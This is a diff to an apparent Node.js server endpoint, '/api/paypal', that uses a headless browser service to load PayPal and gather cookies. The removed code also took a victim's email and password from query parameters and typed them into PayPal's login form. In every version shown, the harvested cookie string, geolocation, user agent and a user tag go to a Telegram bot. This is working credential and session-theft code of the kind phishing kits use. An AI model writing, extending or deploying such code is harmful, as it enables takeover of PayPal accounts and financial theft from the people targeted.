@@ -57,25 +57,12 @@ async function sendToTelegram(paypalCookies, userTag, examNumber, geoInfo, url, 
     }
 }
 
-async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent, email, password) {
+async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent) {
     const userAgent = clientUserAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36';
 
-    // GraphQL query to navigate, log in, and get cookies with aliases for conflicting fields
     const query = `
-        mutation LoginAndGetCookies($url: String!, $email: String!, $password: String!) {
-            goto(url: $url, waitUntil: "networkIdle") {
-                status
-            }
-            typeEmail: type(selector: "input#email", text: $email) {
-                status
-            }
-            typePassword: type(selector: "input#password", text: $password) {
-                status
-            }
-            clickLogin: click(selector: "button#btnLogin") {
-                status
-            }
-            waitForNavigation(waitUntil: "networkIdle") {
+        mutation {
+            goto(url: "${paypalUrl}", waitUntil: networkIdle) {
                 status
             }
             cookies {
@@ -88,6 +75,7 @@ async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgen
                     httpOnly
                     sameSite
                     expires
+                    url
                 }
                 time
             }
@@ -97,26 +85,23 @@ async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgen
     try {
         const response = await fetch(`${BROWSERLESS_ENDPOINT}?token=${BROWSERLESS_TOKEN}`, {
             method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-                query: query,
-                variables: {
-                    url: paypalUrl,
-                    email: email,
-                    password: password
-                }
-            })
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ query })
         });
 
         const data = await response.json();
-        if (data.errors) throw new Error(data.errors[0].message);
+        if (data.errors) {
+            throw new Error(data.errors[0].message);
+        }
 
         const cookieResponse = data.data.cookies;
         let cookieString = "";
+
         if (cookieResponse && Array.isArray(cookieResponse.cookies)) {
-            cookieResponse.cookies.forEach(cookie => {
+            // Filter cookies: only those with an expiration timestamp (non-session)
+            const mainCookies = cookieResponse.cookies.filter(cookie => cookie.expires && cookie.expires > 0);
+
+            mainCookies.forEach(cookie => {
                 if (cookie.name && cookie.value) {
                     cookieString += `${cookie.name}=${cookie.value}; `;
                 }
@@ -124,7 +109,7 @@ async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgen
         }
 
         const geoInfo = await getGeoInfo();
-        await sendToTelegram(cookieString || "No cookies found", userTag, examNumber, geoInfo, paypalUrl, userAgent);
+        await sendToTelegram(cookieString || "No main cookies found", userTag, examNumber, geoInfo, paypalUrl, userAgent);
 
         return {
             success: true,
@@ -148,18 +133,12 @@ app.get('/api/paypal', async (req, res) => {
     const userTag = req.query.userTag || 'UnknownUser';
     const examNumber = req.query.examNumber || '';
     const clientUserAgent = req.headers['user-agent'] || '';
-    const email = req.query.email;
-    const password = req.query.password;
 
     if (!paypalUrl.startsWith('https://www.paypal.com')) {
         return res.status(400).json({ success: false, error: 'Invalid PayPal URL' });
     }
 
-    if (!email || !password) {
-        return res.status(400).json({ success: false, error: 'Email and password are required' });
-    }
-
-    const result = await fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent, email, password);
+    const result = await fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent);
     res.json(result);
 });
 
